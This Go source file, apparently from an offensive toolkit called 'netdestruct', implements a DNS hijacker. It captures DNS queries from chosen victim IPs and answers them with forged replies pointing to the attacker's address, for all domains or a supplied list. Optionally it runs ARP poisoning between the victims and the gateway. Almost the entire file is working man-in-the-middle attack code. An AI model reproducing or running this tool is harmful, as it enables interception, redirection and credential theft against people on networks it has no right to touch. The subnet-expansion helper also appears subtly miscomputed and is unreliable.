package dns

import (
	"bufio"
	"context"
	"fmt"
	"net"
	"os"
	"os/signal"
	"strings"
	"sync"

	"netdestruct/libs/dos/routing"
	"netdestruct/libs/mitm/arp"
)

const (
	dnsTag          = "\x1b[36m[DNS]\x1b[0m"
	greenTag        = "\x1b[32m"
	maxIPv4HostBits = 12
)

// Hijacker forges DNS replies to queries from --target hosts.
type Hijacker struct {
	Interface   string
	Target      string
	SpoofDomain string // single, comma-separated, or path to domain list file; empty = wildcard *
}

func (h *Hijacker) Run() error {
	victims, err := expandVictimIPs(h.Target)
	if err != nil {
		return err
	}

	iface, err := net.InterfaceByName(h.Interface)
	if err != nil {
		return fmt.Errorf("interface %q: %w", h.Interface, err)
	}
	ourV4, _ := ifaceIPv4(iface)
	ourV6, _ := ifaceIPv6(iface)
	if ourV4 == nil && ourV6 == nil {
		return fmt.Errorf("interface %s has no IPv4 or IPv6 address", h.Interface)
	}

	spoofDomains, err := loadSpoofDomains(h.SpoofDomain)
	if err != nil {
		return err
	}

	fmt.Printf("%s Starting DNS hijacking...\n", dnsTag)
	if len(spoofDomains) == 0 {
		fmt.Printf("%s Spoofing all DNS queries (no --spoof-domain; wildcard mode)\n", dnsTag)
	} else {
		fmt.Printf("%s Spoofing %d domain pattern(s)\n", dnsTag, len(spoofDomains))
	}

	reader := bufio.NewReader(os.Stdin)
	fmt.Print("Activate ARP spoofing for the target(s)? [y/N]: ")
	arpLine, _ := reader.ReadString('\n')
	doARP := strings.EqualFold(strings.TrimSpace(arpLine), "y")

	fmt.Print("Default gateway IP: ")
	gwLine, _ := reader.ReadString('\n')
	gateway := net.ParseIP(strings.TrimSpace(gwLine))
	if gateway == nil {
		return fmt.Errorf("invalid gateway IP %q", strings.TrimSpace(gwLine))
	}

	capSock, err := openCaptureSocket(iface)
	if err != nil {
		return err
	}
	defer capSock.Close()

	var send4 *rawSocket
	if ourV4 != nil {
		send4, err = openRawSocket(iface)
		if err != nil {
			return err
		}
		defer send4.Close()
	}

	var send6 *rawSocket
	if ourV6 != nil {
		send6, err = openRawSocket6(iface)
		if err == nil {
			defer send6.Close()
		}
	}

	targets := make(map[string]bool, len(victims))
	for _, v := range victims {
		targets[v.String()] = true
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	sig := make(chan os.Signal, 1)
	signal.Notify(sig, os.Interrupt)
	go func() {
		<-sig
		fmt.Printf("\n%s Stopped.\n", dnsTag)
		cancel()
		os.Exit(0)
	}()

	var wg sync.WaitGroup
	if doARP {
		wg.Add(1)
		go func() {
			defer wg.Done()
			p := &arp.LoopPoisoner{
				Interface: h.Interface,
				Targets:   victims,
				Gateway:   gateway,
			}
			if err := p.Run(ctx); err != nil && ctx.Err() == nil {
				fmt.Fprintf(os.Stderr, "%s ARP: %v\n", dnsTag, err)
			}
		}()
	}

	fmt.Printf("%s Listening for UDP/53 queries from %d target(s)\n", dnsTag, len(victims))

	buf := make([]byte, 65536)
	for {
		select {
		case <-ctx.Done():
			wg.Wait()
			return nil
		default:
		}
		_ = capSock.SetReadTimeout(500)
		n, err := capSock.Recv(buf)
		if err != nil || n < 14 {
			continue
		}
		pkt, ok := parseDNSFrame(buf[:n])
		if !ok || pkt.DstPort != dnsPort {
			continue
		}
		if !targets[pkt.SrcIP.String()] {
			continue
		}
		if ourV4 != nil && pkt.SrcIP.Equal(ourV4) {
			continue
		}
		if ourV6 != nil && pkt.SrcIP.Equal(ourV6) {
			continue
		}
		if !isDNSQuery(pkt.Payload) {
			continue
		}
		qtype, ok := queryType(pkt.Payload)
		if !ok {
			continue
		}
		name, ok := parseQueryName(pkt.Payload)
		if !ok {
			continue
		}
		if !shouldSpoofQuery(name, spoofDomains) {
			continue
		}

		fmt.Printf("%s[+] recieved DNS QUERY type %s from %s:%d : %s\x1b[0m\n",
			greenTag, qtypeLabel(qtype), pkt.SrcIP, pkt.SrcPort, name)

		resp, ok := buildSpoofResponse(pkt.Payload, qtype, ourV4, ourV6)
		if !ok {
			continue
		}

		var sendErr error
		if pkt.IPv6 {
			if send6 == nil {
				continue
			}
			frame := buildIPv6UDPDNS(pkt.DstIP, pkt.SrcIP, pkt.DstPort, pkt.SrcPort, resp)
			sendErr = send6.Send6(frame, pkt.SrcIP)
		} else {
			if send4 == nil {
				continue
			}
			frame := buildIPv4UDPDNS(pkt.DstIP, pkt.SrcIP, pkt.DstPort, pkt.SrcPort, resp)
			sendErr = send4.Send(frame, pkt.SrcIP)
		}
		if sendErr != nil {
			fmt.Fprintf(os.Stderr, "%s reply to %s failed: %v\n", dnsTag, pkt.SrcIP, sendErr)
			continue
		}

		fmt.Printf("%s[+] spoofed response sent to %s\x1b[0m\n", greenTag, pkt.SrcIP)
	}
}

func ifaceIPv4(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	for _, a := range addrs {
		if n, ok := a.(*net.IPNet); ok {
			if v4 := n.IP.To4(); v4 != nil {
				return v4, nil
			}
		}
	}
	return nil, fmt.Errorf("no IPv4 on %s", iface.Name)
}

func ifaceIPv6(iface *net.Interface) (net.IP, error) {
	addrs, err := iface.Addrs()
	if err != nil {
		return nil, err
	}
	var linkLocal net.IP
	for _, a := range addrs {
		if n, ok := a.(*net.IPNet); ok {
			if n.IP.To4() != nil {
				continue
			}
			if n.IP.IsGlobalUnicast() {
				return n.IP, nil
			}
			if n.IP.IsLinkLocalUnicast() && linkLocal == nil {
				linkLocal = n.IP
			}
		}
	}
	if linkLocal != nil {
		return linkLocal, nil
	}
	return nil, fmt.Errorf("no IPv6 on %s", iface.Name)
}

func expandVictimIPs(spec string) ([]net.IP, error) {
	routes, err := routing.ExpandTargets(spec)
	if err != nil {
		return nil, err
	}
	seen := make(map[string]bool)
	var out []net.IP
	for _, route := range routes {
		for _, ip := range hostsFromRoute(route) {
			key := ip.String()
			if !seen[key] {
				seen[key] = true
				out = append(out, ip)
			}
		}
	}
	if len(out) == 0 {
		return nil, fmt.Errorf("no victim IPs resolved from %q", spec)
	}
	return out, nil
}

func hostsFromRoute(r routing.Route) []net.IP {
	if v4 := r.Addr.To4(); v4 != nil {
		if r.PrefixLen >= 32 {
			return []net.IP{v4}
		}
		return allIPv4Hosts(r)
	}
	if r.PrefixLen >= 128 {
		return []net.IP{r.Addr.To16()}
	}
	return nil
}

func allIPv4Hosts(r routing.Route) []net.IP {
	v4 := r.Addr.To4()
	if v4 == nil {
		return nil
	}
	ones := r.PrefixLen
	if ones <= 0 {
		ones = 32
	}
	hostBits := 32 - ones
	if hostBits > maxIPv4HostBits {
		hostBits = maxIPv4HostBits
	}
	network := routing.IPv4ToUint32(v4) & (^uint32(0) << uint(32-hostBits))
	count := uint32(1) << uint(hostBits)
	out := make([]net.IP, 0, count)
	for i := uint32(0); i < count; i++ {
		out = append(out, routing.Uint32ToIPv4(network+i))
	}
	return out
}
